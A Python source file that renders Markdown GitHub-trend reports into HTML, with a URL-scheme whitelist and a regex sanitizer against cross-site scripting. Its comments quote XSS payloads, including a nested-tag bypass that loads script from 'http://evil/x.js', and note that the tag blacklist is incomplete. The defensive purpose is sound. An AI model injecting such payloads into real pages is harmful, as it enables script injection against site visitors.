"""报告 Markdown → HTML 页面(服务端渲染)。

只产出字符串,不认识 HTTP:状态码、缓存头、路由由 `api_server` 决定。结构化榜单走主从
布局、每个字段单独 escape;其余 .md 退回通用 Markdown 渲染,那条路径要额外清洗原始 HTML。

榜单内容全部来自外部:凡是拼进 HTML 的都过 `escape`,凡是进 href/src 的都过 `_is_safe_url`
协议白名单 —— 这是安全边界,不是代码风格。class 名和 DOM 形状被 report.css / report.js
按名字依赖,改名不会报错,只会静默错版。
"""

from __future__ import annotations

import functools
import hashlib
import logging
import re
from html import escape, unescape
from pathlib import Path
from typing import NamedTuple

from markdown import Markdown

from .. import config
from ..core import report_parse
from ..infra.store import reports, universe
from ..infra.store.atomic import StoreReadError
from ..tools.describe import SECTIONS

logger = logging.getLogger("hot_project")

_REPORT_TEMPLATE = "report.html"
_EMPTY_TOC = '<p class="toc-empty">当前报告暂无可跳转目录。</p>'


# ══════════════════════════════════════════════════════════════
# 静态资源与模板
# ══════════════════════════════════════════════════════════════


def _asset_path(path_name: str) -> Path:
    """web 目录下的资源路径。越出目录的名字一律当「资源不存在」。

    挡住穿越只要两行,漏了它以后谁把请求里的文件名接进来,就变成任意文件读取。
    """
    root = config.WEB_DIR.resolve()
    path = (root / path_name).resolve()
    if path != root and root not in path.parents:
        raise FileNotFoundError(f"web 资源越界:{path_name}")
    return path


def asset_text(path_name: str) -> str:
    """读 web 目录里的文本资源。读不到就让 OSError 冒出去,由 `api_server` 翻成状态码。"""
    return _asset_path(path_name).read_text(encoding="utf-8")


@functools.lru_cache(maxsize=1)
def _asset_version() -> str:
    """web 目录的指纹,拼在 css/js 的 `?v=` 上,让浏览器只在文件真的改了之后才重新下载。

    一个进程只算一次,运行中改了静态文件就重启服务。子目录(vendor/)不参与。
    """
    digest = hashlib.md5(usedforsecurity=False)
    root = config.WEB_DIR
    for path in sorted(root.glob("*")) if root.is_dir() else []:
        if path.is_file():
            digest.update(f"{path.name}:{path.stat().st_mtime}".encode())
    return digest.hexdigest()[:10]


def page(path_name: str, replacements: dict[str, str]) -> str:
    """占位符模板 → 最终 HTML,`__ASSET_VER__` 总是自动补上(调用方给了则用调用方的)。

    不改调用方传进来的字典 —— 复用同一个字典时会带上上一次渲染的残留值。
    """
    document = asset_text(path_name)
    for placeholder, value in {"__ASSET_VER__": _asset_version(), **replacements}.items():
        document = document.replace(placeholder, value)
    return document


# ══════════════════════════════════════════════════════════════
# 链接白名单 —— 报告里的 URL 一律先过这里
# ══════════════════════════════════════════════════════════════

_SAFE_SCHEMES = frozenset({"http", "https", "mailto"})
_RELATIVE_PREFIXES = ("#", "/", "./", "../", "//")
_SCHEME = re.compile(r"^([a-zA-Z][a-zA-Z0-9+.-]*):")
_CTRL = re.compile(r"[\x00-\x20]+")
# 无引号那一支不能省:原文里直接写的 `<a href=javascript:alert(1)>` 会原样穿过渲染,
# 只认带引号的等于放它过去。
_URL_ATTR = re.compile(
    r'(?P<attr>\b(?:href|src))\s*=\s*'
    r'(?:(?P<quote>["\'])(?P<quoted>.*?)(?P=quote)|(?P<bare>[^\s>]+))',
    re.IGNORECASE,
)


def _is_safe_url(url: str) -> bool:
    """只放行 http / https / mailto 与站内相对链接,`javascript:` `data:` 一律拦掉。

    判之前要先 unescape 再抹掉控制字符:`java&#09;script:alert(1)` 这类写法浏览器照样当
    javascript 协议执行,只看原串会漏(抹掉只为判断,输出仍是原串)。取不出协议的一律放行。
    """
    normalized = unescape(url or "").strip()
    if not normalized:
        return False
    compact = _CTRL.sub("", normalized)
    if normalized.startswith(_RELATIVE_PREFIXES) or compact.startswith(_RELATIVE_PREFIXES):
        return True
    scheme = _SCHEME.match(compact)
    return scheme.group(1).lower() in _SAFE_SCHEMES if scheme else True


def _safe_href(url: str) -> str:
    return url if _is_safe_url(url) else "#"


def _sanitize_urls(html_text: str) -> str:
    """给渲染完的 HTML 再过一遍链接白名单。

    必须放在渲染**之后**:`[x](javascript:alert(1))` 在 Markdown 原文里长得像普通链接,
    要等 markdown 库把它变成 href 才认得出来。
    """

    def replace(match: re.Match[str]) -> str:
        quote = match.group("quote")
        value = match.group("quoted") if quote else match.group("bare")
        if _is_safe_url(value):
            return match.group(0)
        # href 换成锚点(点了什么也不发生),src 只能清空 —— 给 src 塞 "#" 会让浏览器
        # 重新请求当前页面。重写时一律补上引号,以免裸值中的空格把后续内容拆成新属性。
        fallback = "#" if match.group("attr").lower() == "href" else ""
        return f'{match.group("attr")}="{fallback}"'

    return _URL_ATTR.sub(replace, html_text)


# ══════════════════════════════════════════════════════════════
# 文本零件
# ══════════════════════════════════════════════════════════════

_NON_ALNUM = re.compile(r"[^a-zA-Z0-9]+")
_BLANK_LINE = re.compile(r"\n\s*\n")
_TOPIC_SEP = re.compile(r"[，,]")


def _slug(text: str) -> str:
    """锚点 id。中文被整段吃掉是有意的:id 要能直接拼进 `href="#..."` 而不必再编码。
    清完为空时兜底成 section —— 空 id 的标题点不到。
    """
    return _NON_ALNUM.sub("-", text.lower()).strip("-") or "section"


def _paragraphs(text: str) -> list[str]:
    return [block.strip() for block in _BLANK_LINE.split(text) if block.strip()]


def _stat(label: str, value: str, kind: str = "") -> str:
    class_name = f"repo-stat repo-stat--{kind}" if kind else "repo-stat"
    return (
        f'<div class="{class_name}">'
        '<div class="repo-stat__body">'
        f'<span class="repo-stat__label">{escape(label)}</span>'
        f'<strong class="repo-stat__value">{escape(value)}</strong>'
        '</div>'
        '</div>'
    )


# ══════════════════════════════════════════════════════════════
# 上期对比 —— 蓝色「上新」徽章 + 排名变化
# ══════════════════════════════════════════════════════════════

# 报告名 = 日期 + 类型/区间/方向尾缀:2026-07-07.md / 2026-07-07_NEW.md /
# 2026-07-07_KEY_10d.md / 2026-07-07_KEY_向量库.md(方向可含中文)
_NAME = re.compile(r"^(?P<date>\d{4}-\d{2}-\d{2})(?P<suffix>.*)\.md$")


class _Diff(NamedTuple):
    prev_name: str
    prev_ranks: dict[str, int]
    added: int
    removed: int


@functools.lru_cache(maxsize=16)
def _load_cached(name: str, mtime: float) -> report_parse.Report | None:
    """解析上一期报告,按 (文件名, mtime) 缓存。

    mtime 必须进 key:同一天的报告会被重跑覆盖,只按文件名缓存就会一直拿着旧一期的排名,
    页面上的 ↑↓ 和「上新」全是过期数据。mtime 只能当参数传进来 —— lru_cache 只认参数。
    """
    return reports.load(name)


def _mtime(name: str) -> float | None:
    try:
        return (reports.directory() / name).stat().st_mtime
    except OSError:
        return None


def _title_prefix(report: report_parse.Report) -> str:
    """标题去掉日期部分(「GitHub 热门项目 — 2026-07-01」→「GitHub 热门项目」)。"""
    return (report.title or "").split("—")[0].strip()


def _prev_report(
    name: str, current: report_parse.Report
) -> tuple[str, report_parse.Report] | None:
    """同尾缀(同类榜)且日期更早的最近一份报告。

    尾缀相同还不够,得再比一次标题前缀:重命名规则之前生成的旧文件里关键词榜和综合榜的
    尾缀会混叠,拿它当上一期会算出一整页假的「上新」。
    """
    m = _NAME.match(name)
    if not m:
        return None
    day, suffix = m.group("date"), m.group("suffix")

    earlier: list[tuple[str, str]] = []
    for item in reports.listing():
        pm = _NAME.match(item.name)
        if not pm or item.name == name:
            continue
        if pm.group("suffix") != suffix or pm.group("date") >= day:
            continue
        earlier.append((pm.group("date"), item.name))

    for _, fname in sorted(earlier, reverse=True):
        mtime = _mtime(fname)
        if mtime is None:
            continue
        report = _load_cached(fname, mtime)
        if report is None or _title_prefix(report) != _title_prefix(current):
            continue
        return fname, report
    return None


def _diff_of(name: str, current: report_parse.Report) -> _Diff | None:
    prev = _prev_report(name, current)
    if prev is None:
        return None
    prev_name, prev_report = prev
    prev_ranks = {e.repo: e.rank for e in prev_report.entries}
    now = {e.repo for e in current.entries}
    return _Diff(
        prev_name,
        prev_ranks,
        added=sum(1 for repo in now if repo not in prev_ranks),
        removed=sum(1 for repo in prev_ranks if repo not in now),
    )


# ══════════════════════════════════════════════════════════════
# 描述与 DB 实时同步
# ══════════════════════════════════════════════════════════════
#
# 报告 .md 里的四段描述是生成当天写死的快照。渲染时用 DB 里的 desc 覆盖同名小节,这样描述
# 被修正或重刷之后,已经生成的旧报告也跟着更新(star、增长这些统计仍保持当时的快照 ——
# 它们是那一天的事实,不该被今天的数覆盖)。
#
# DB 有 29MB 且绝大部分是 star 历史,所以只抽非空 desc 建索引(体量小),并按 mtime 缓存:
# 每次渲染都重读一遍 30MB 会让页面卡到不可用。

# 四段规范之前生成的描述还有这两段。它们不进报告,但必须参与切分 —— 不认它们的话,
# 它们的正文会被当成上一段的续行,粘到「技术架构与特性」的覆盖文本里。
_LEGACY_SECTIONS = ("核心依赖与生态", "已知局限或注意事项")
_DESC_HEAD = re.compile(
    r"^(?P<title>"
    + "|".join(re.escape(t) for t in SECTIONS + _LEGACY_SECTIONS)
    + r")[:：]\s*(?P<body>.*)$"
)

# (mtime, 索引)。只留一份:DB 只有一个,历史版本没有读者。
_desc_cache: tuple[float, dict[str, str]] | None = None


def _desc_index() -> dict[str, str]:
    """{仓库: desc},只含非空的。

    DB 读不出来时退回上一份索引(没有就空):描述只是覆盖层,拿不到就让报告显示 .md 里的
    原文,不该让整页渲染失败。
    """
    global _desc_cache
    try:
        mtime = config.DB_PATH.stat().st_mtime
    except OSError:
        return {}
    if _desc_cache and _desc_cache[0] == mtime:
        return _desc_cache[1]

    try:
        records = universe.load()
    except StoreReadError as e:
        logger.warning("DB 描述索引加载失败:%s", e)
        return _desc_cache[1] if _desc_cache else {}

    index: dict[str, str] = {}
    for repo, info in records.items():
        desc = (info.get("desc") or "").strip() if isinstance(info, dict) else ""
        if desc:
            index[repo] = desc
    _desc_cache = (mtime, index)
    logger.info("DB 描述索引已刷新:%d 条非空描述", len(index))
    return index


def _desc_sections(desc: str) -> dict[str, str]:
    """DB 里「标题:内容」分段的 desc → {标题: 内容}。

    标题限定为已知小节名,不认任何「X:」都当标题:描述正文里本来就有冒号
    (「支持 Python:3.10 以上」),放开就会把正文切碎。
    """
    sections: dict[str, str] = {}
    current = ""
    for raw in desc.splitlines():
        line = raw.strip()
        if not line:
            continue
        if head := _DESC_HEAD.match(line):
            current = head.group("title")
            sections[current] = head.group("body").strip()
        elif current:
            sections[current] = f"{sections[current]} {line}".strip()
    return sections


# ══════════════════════════════════════════════════════════════
# 主从布局
# ══════════════════════════════════════════════════════════════

# 常见主语言的标识色(侧栏语言圆点),未收录语言回退灰色
_LANG_COLORS = {
    "python": "#3572A5", "typescript": "#3178c6", "javascript": "#f1e05a",
    "go": "#00ADD8", "rust": "#dea584", "c++": "#f34b7d", "c": "#555555",
    "java": "#b07219", "kotlin": "#A97BFF", "swift": "#F05138", "ruby": "#701516",
    "c#": "#178600", "html": "#e34c26", "css": "#563d7c", "shell": "#89e051",
    "jupyter notebook": "#DA5B0B", "dart": "#00B4AB", "php": "#4F5D95",
    "zig": "#ec915c", "lua": "#000080", "vue": "#41b883", "svelte": "#ff3e00",
}


def _structured_html(
    report: report_parse.Report, diff: _Diff | None
) -> tuple[str, str]:
    """返回 (详情面板集合, 侧栏项目列表)。

    两块 HTML 共用同一轮计算(排名差、语言、增长、上新),所以写在一个循环里而不是两个
    函数 —— 拆开就要把十个中间值来回传,而且两边算出不一样的结论时没人会发现。
    """
    article_parts: list[str] = []
    nav_items: list[str] = []
    prev_ranks = diff.prev_ranks if diff else None
    desc_index = _desc_index()

    for entry in report.entries:
        metadata = entry.metadata
        overrides = _desc_sections(desc_index.get(entry.repo, ""))
        anchor = f"repo-{entry.rank}-{_slug(entry.repo)}"

        repo_link = _safe_href(entry.link or f"https://github.com/{entry.repo}")
        readme_link = _safe_href(f"{repo_link}#readme") if repo_link != "#" else "#"

        topics = [t.strip() for t in _TOPIC_SEP.split(metadata.get("主题标签", "")) if t.strip()]
        language = metadata.get("主语言", "")
        status_value = metadata.get("项目状态", "")
        # 增长字段名带着窗口天数(「近7天增长」),标签要按原名显示,所以除了 growth_of
        # 给的值还得知道键名。
        growth_label = next((k for k in metadata if "增长" in k), "")
        growth_value = report_parse.growth_of(metadata)

        stat_items: list[str] = []
        if metadata.get("总 Star"):
            stat_items.append(_stat("总 Star", metadata["总 Star"], "star"))
        if growth_label and growth_value:
            stat_items.append(_stat(growth_label, growth_value, "growth"))
        if language:
            stat_items.append(_stat("主语言", language, "language"))
        created_extra = (
            f' <span class="repo-stat__tag repo-stat__tag--new" title="{escape(status_value)}">NEW</span>'
            if status_value else ""
        )
        stat_items.append(
            '<div class="repo-stat repo-stat--created">'
            '<div class="repo-stat__body">'
            '<span class="repo-stat__label">创建时间</span>'
            f'<strong class="repo-stat__value">{escape(metadata.get("创建时间", "未知"))}{created_extra}</strong>'
            '</div>'
            '</div>'
        )

        section_items: list[str] = []
        for section in entry.sections:
            title = section["title"]
            # DB 的 desc 优先于 .md 里写死的那份;DB 没有这一段就用原文。
            content = overrides.get(title) or section["content"]
            paragraphs = _paragraphs(content) or ["暂无补充信息，可进入仓库查看 README。"]
            section_items.append(
                '<section class="repo-panel">'
                f'<h3 id="{anchor}-{_slug(title)}">{escape(title)}</h3>'
                + "".join(f"<p>{escape(p)}</p>" for p in paragraphs)
                + '</section>'
            )

        topics_html = ""
        if topics:
            tags_html = "".join(f'<span class="repo-topic">{escape(t)}</span>' for t in topics[:6])
            topics_html = f'<div class="repo-detail__topics">{tags_html}</div>'

        actions_html = (
            '<div class="repo-detail__actions">'
            f'<a class="repo-action" href="{escape(repo_link)}" target="_blank" rel="noreferrer">打开仓库 ↗</a>'
            f'<a class="repo-action repo-action--ghost" href="{escape(readme_link)}" target="_blank" rel="noreferrer">查看 README</a>'
            f'<button type="button" class="repo-action repo-action--ghost repo-trend-btn" data-repo="{escape(entry.repo)}">📈 star 走势</button>'
            '</div>'
            '<div class="repo-trend" hidden></div>'
        )

        # 上期没有 → 蓝色「上新」;排名变化 → ↑/↓。没有上一期时(prev_ranks 是 None)
        # 两者都不出现 —— 那不是「全部上新」,是「无从比较」。
        is_fresh = prev_ranks is not None and entry.repo not in prev_ranks
        delta = prev_ranks[entry.repo] - entry.rank if prev_ranks is not None and not is_fresh else 0
        delta_html = nav_delta = ""
        if delta:
            way, word, arrow = ("up", "上升", "↑") if delta > 0 else ("down", "下降", "↓")
            magnitude = abs(delta)
            delta_html = (
                f'<span class="repo-detail__delta repo-detail__delta--{way}" '
                f'title="较上期{word} {magnitude} 名">{arrow}{magnitude}</span>'
            )
            nav_delta = (
                f'<span class="repo-nav__delta repo-nav__delta--{way}">{arrow}{magnitude}</span>'
            )
        fresh_badge = '<span class="repo-detail__fresh" title="上期报告中没有的项目">上新</span>' if is_fresh else ""
        new_badge = '<span class="repo-detail__new" title="新项目">NEW</span>' if status_value else ""
        fresh_attr = ' data-fresh="1"' if is_fresh else ""

        article_parts.append(
            f'<section class="repo-detail" id="{anchor}" data-repo="{escape(entry.repo)}" data-rank="{entry.rank}"{fresh_attr}>'
            '<header class="repo-detail__head">'
            f'<span class="repo-detail__rank">#{entry.rank}</span>'
            f'{delta_html}'
            f'<h2>{escape(entry.repo)}</h2>'
            f'{fresh_badge}'
            f'{new_badge}'
            '</header>'
            f'<div class="repo-detail__stats">{"".join(stat_items)}</div>'
            f'{topics_html}'
            f'<div class="repo-detail__grid">{"".join(section_items)}</div>'
            f'{actions_html}'
            '</section>'
        )

        lang_dot = ""
        if language:
            color = _LANG_COLORS.get(language.strip().lower(), "#8b94a7")
            lang_dot = f'<span class="repo-nav__lang"><i style="background:{color}"></i>{escape(language)}</span>'
        growth_chip = f'<span class="repo-nav__growth">{escape(growth_value)}</span>' if growth_value else ""
        new_chip = '<span class="repo-nav__new">NEW</span>' if status_value else ""
        fresh_chip = '<span class="repo-nav__fresh">上新</span>' if is_fresh else ""
        search_blob = " ".join([entry.repo, language] + topics).lower()
        nav_items.append(
            f'<a class="repo-nav__item" href="#{anchor}" data-panel="{anchor}" '
            f'data-repo="{escape(entry.repo)}" data-search="{escape(search_blob)}"{fresh_attr}>'
            f'<span class="repo-nav__rank">{entry.rank}</span>'
            '<span class="repo-nav__body">'
            f'<span class="repo-nav__name">{escape(entry.repo)}</span>'
            # 徽章放 meta 行行首:项目名过长被截断时徽章仍可见;收藏 ★ 由 report.js 挂载
            f'<span class="repo-nav__meta">{fresh_chip}{new_chip}{growth_chip}{nav_delta}{lang_dot}</span>'
            '</span>'
            '</a>'
        )

    toc_html = (
        f'<nav class="repo-nav" id="repo-nav">{"".join(nav_items)}</nav>'
        if nav_items else _EMPTY_TOC
    )
    article_html = "".join(article_parts) if article_parts else '<p>当前报告暂无项目内容。</p>'
    return article_html, toc_html


def _summary_chips(summary: str, extra_chips: list[str] | None = None) -> str:
    """把「共 N 个项目 | 窗口: 7 天 | …」形式的摘要拆成头部信息条。

    只有一段又没有附加 chip 时按整句排版:单个 chip 在页面上看着像被截断的碎片。

    `extra_chips` 是已经渲染好的 HTML(上期对比统计),不再过 escape。
    """
    text = (summary or "").strip()
    extra = "".join(extra_chips or [])
    if not text:
        return f'<div class="hero__chips">{extra}</div>' if extra else ""
    parts = [p.strip() for p in text.split("|") if p.strip()]
    if len(parts) <= 1 and not extra:
        return f'<p class="hero__summary">{escape(text)}</p>'
    chips = "".join(f'<span class="hero__chip">{escape(p)}</span>' for p in parts)
    return f'<div class="hero__chips">{chips}{extra}</div>'


# ══════════════════════════════════════════════════════════════
# 通用 Markdown 路径
# ══════════════════════════════════════════════════════════════
#
# 渲染前的预清洗。.md 里可以写原始 HTML,markdown 库会照原样透传,所以危险标签和 on* 事件
# 属性得在进渲染器之前就抹掉。结构化榜单那条路径不需要这一步 —— 那边每个字段单独 escape。
#
# 正则清洗是钝器:它抹掉的是这几个已知标签和 on* 属性,不是完备的 HTML 消毒(`onerror=x`
# 被抹成裸的 `x`,标签本身还在)。且 report/ 里的内容并非全都出自我们之手 —— agent 的报告
# 保存工具是聊天驱动的,提示词里让它写什么它就写什么。所以这里按"内容不可信"对待:
# ponytail: 黑名单清洗,不是白名单。撑得住已知向量(见 test_web.py 的探针集),但下一个
# 没想到的形态就是下一个洞。真正的修法是换 nh3/bleach 做白名单,代价是多一个依赖。

_RAW_TAG_PAIR = re.compile(
    r"<(script|iframe|object|embed|form|input|style)[^>]*>.*?</\1>",
    re.DOTALL | re.IGNORECASE,
)
_RAW_TAG = re.compile(
    r"<(script|iframe|object|embed|form|input|style)[^>]*/?\s*>", re.IGNORECASE
)
_EVENT_ATTR = re.compile(r"\bon\w+\s*=", re.IGNORECASE)

# 替换一次不够:删掉内层匹配后,剩下的两截会重新拼成一个新标签。实测
# `<scr<script>ipt src=http://evil/x.js>` 单次清洗后会渲染出可执行的外链 script。
# 每轮只做删除,所以文本严格变短,必然收敛;给个上限是防着有人拿深嵌套刷 O(n²)。
_MAX_CLEAN_PASSES = 8


def _clean_raw_html(text: str) -> str:
    for _ in range(_MAX_CLEAN_PASSES):
        cleaned = _EVENT_ATTR.sub("", _RAW_TAG.sub("", _RAW_TAG_PAIR.sub("", text)))
        if cleaned == text:
            return cleaned
        text = cleaned
    return escape(text)     # 收敛不了就整篇转义:宁可显示成源码,也不把它交给浏览器


def _plain_page(name: str, markdown: str) -> str:
    lines = markdown.splitlines()
    title = next((ln[2:].strip() for ln in lines if ln.startswith("# ")), name)
    summary = next((ln[1:].strip() for ln in lines if ln.startswith(">")), "")

    text = _clean_raw_html(markdown)

    md = Markdown(extensions=["extra", "sane_lists", "toc", "nl2br"], output_format="html5")
    article_html = _sanitize_urls(md.convert(text))
    toc_html = _sanitize_urls(getattr(md, "toc", ""))

    return page(
        _REPORT_TEMPLATE,
        {
            "__REPORT_NAME__": escape(name),
            "__REPORT_TITLE__": escape(title),
            "__REPORT_SUMMARY_HTML__": _summary_chips(
                summary or "这是一份由服务器根据 Markdown 报告渲染出的可读网页。"
            ),
            "__REPORT_TOC_HTML__": toc_html if toc_html.strip() else _EMPTY_TOC,
            "__REPORT_ARTICLE_HTML__": article_html,
        },
    )


def _structured_page(name: str, report: report_parse.Report) -> str:
    diff = _diff_of(name, report)
    article_html, toc_html = _structured_html(report, diff)

    extra_chips: list[str] = []
    if diff:
        extra_chips.append(
            '<span class="hero__chip hero__chip--fresh">'
            f'较上期 {escape(diff.prev_name.rsplit(".", 1)[0])}: '
            f'上新 {diff.added} · 移出 {diff.removed}'
            '</span>'
        )

    return page(
        _REPORT_TEMPLATE,
        {
            "__REPORT_NAME__": escape(name),
            "__REPORT_TITLE__": escape(report.title or name),
            "__REPORT_SUMMARY_HTML__": _summary_chips(report.summary, extra_chips),
            "__REPORT_TOC_HTML__": toc_html,
            "__REPORT_ARTICLE_HTML__": article_html,
        },
    )


def report_html(name: str, markdown: str) -> str:
    """一份报告的完整 HTML 页面。

    `name` 只用于展示和找上一期,不用来读文件 —— 原文由调用方读好传进来
    (它已经过 `reports.resolve_name`,那才是挡路径穿越的地方)。
    """
    report = report_parse.parse(markdown)
    return _structured_page(name, report) if report else _plain_page(name, markdown)
